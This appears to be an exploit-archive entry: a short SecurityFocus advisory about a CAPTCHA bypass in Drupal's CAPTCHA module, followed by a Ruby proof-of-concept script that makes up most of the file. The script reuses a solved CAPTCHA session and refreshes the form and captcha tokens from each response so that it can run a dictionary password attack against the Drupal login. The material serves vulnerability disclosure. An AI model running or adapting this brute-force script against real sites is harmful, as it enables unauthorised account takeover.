@@ -1,0 +1,128 @@
+source: http://www.securityfocus.com/bid/46344/info
+
+The CAPTCHA module for Drupal is prone to a security-bypass vulnerability that occurs in the CAPTCHA authentication routine.
+
+Successful exploits may allow attackers to bypass the CAPTCHA-based authentication routine, allowing attackers to perform brute-force attacks. 
+
+# Drupal Captcha bruteforcing bypass
+
+# This is a Proof Of Concept to demonstrate a logic security flow
+# in the way drupal captcha is used to protect login forms
+# from bruteforce. If the captcha challenge is solved, the next
+# login attempts can be issued without solving any new captcha challenge.
+
+# Usage: change URL, PATH, USERAGENT as you need.
+# Change cookie, captcha_sid, captcha_token, form_build_id with the values
+# you got in the html response AFTER the captcha is solved. This is needed
+# in order to issue the first request as valid.
+# Unique tokens will be then updated automatically .
+
+
+# author: Michele "antisnatchor" Orru'
+
+require "net/http"
+require "net/https"
+require "erb"
+require "singleton"
+require "rubygems"
+require "nokogiri"
+
+
+URL = 'antisnatchor.com'
+PATH = '/user'
+USERAGENT = 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'
+
+# easy to enhance this reading list from a file, but this is just a PoC
+USERNAME_LIST = ['admin']
+PASSWD_LIST = ['test1', 'test2', 'test3', 'guessme']
+
+# these are the session values needed to create valid http requests, after
+# the reCaptcha has been solved the first time, leaving the login form
+# without a new captcha challenge
+cookie = "SESS7fa63be60e31be67df6f271d7756698c=tgg548ajq53m4pb0ne18nsunm0; has_js=1;"
+captcha_sid = "476"
+form_id = "user_login"
+
+
+# these anti-XSRF tokens will change for every http response,
+# so nokogiri is used to parse the html response in order to create
+# the next http request with the valid anti-xsrf/captcha tokens.
+# These initial values will be changed accordingly and automatically
+# for each request .
+
+captcha_token = "d853d6df05f6c6a956a46f20c8fe20aa"
+form_build_id = "form-43fb0bcbcb140066a782a3fc23ab1ab7"
+
+authenticated = false;
+
+
+    @http = Net::HTTP.new(URL, 80)
+    @http.use_ssl = false
+
+     puts "+Initial xsrf token [" + form_build_id + "]"
+     puts "+Initial captcha token [" + captcha_token + "]"
+     puts "+Dictionary attack with [" + PASSWD_LIST.size.to_s + "] passwords"
+     # I'm learning ruby :-)
+     passwd_counter = 0
+
+     while !authenticated && passwd_counter < PASSWD_LIST.size do
+       puts "+Testing password [" + PASSWD_LIST[passwd_counter] + "]"
+
+       post_data = "name=" + USERNAME_LIST[0] + "&pass=" + PASSWD_LIST[passwd_counter] + "&form_build_id=" + form_build_id +
+                   "&form_id=" + form_id + "&captcha_sid="+ captcha_sid +
+                   "&captcha_token=" + captcha_token + "&op=Log+in"
+      @headers = {
+        'Cookie' => cookie,
+        'Referer' => 'http://' + URL + PATH,
+        'Content-Type' => 'application/x-www-form-urlencoded',
+        'User-Agent' => USERAGENT
+      }
+
+      puts "+Request headers = " + @headers.inspect
+
+      resp, data = @http.post2(PATH, post_data, @headers)
+
+      # loads the response in nokogiri to parse anti-XSRF tokens
+      doc = Nokogiri::HTML(data)
+      puts '+Code = ' + resp.code
+      puts '+Message = ' + resp.message
+
+
+      # "debug" code
+      #puts "=================================================== raw response START ======================================================="
+      #puts data
+      #puts "=================================================== raw response END ======================================================="
+
+      if data.index("CAPTCHA session reuse attack detected") != nil
+        puts "Doh', we've been detected by Drupal...quitting now"
+        break
+      end
+
+      if data.index("Sorry, unrecognized username or password") == nil && resp.code == "302"
+        # if credentials will be valid, there will be a 302 response with
+        # a new location header, corresponding to the user home page (http://antisnatchor.com/user/1 for instance)
+        authenticated = true
+      else
+        #parse the anti-xsrf and captcha tokens from the response
+        doc.css('input[id^=form]').each do |form_build_id|
+          form_build_id = form_build_id['id']
+          puts "+New xsrf token [" + form_build_id + "]"
+        end
+
+        doc.css('input[id^=edit-captcha-token]').each do |captcha_token_id|
+          captcha_token = captcha_token_id['value']
+          puts "+New captcha token [" + captcha_token + "]"
+        end
+
+        # I'm still learning ruby :-)
+        passwd_counter = passwd_counter + 1;
+
+      end
+      break if authenticated == true
+     end
+
+if authenticated
+  puts "+Succesfully authenticated user[" + USERNAME_LIST[0] + "] with password [" + PASSWD_LIST[passwd_counter] + "]"
+else
+  puts "+No passwords are valid for user [" + USERNAME_LIST[0] + "]. Dictionary attack failed."
+end
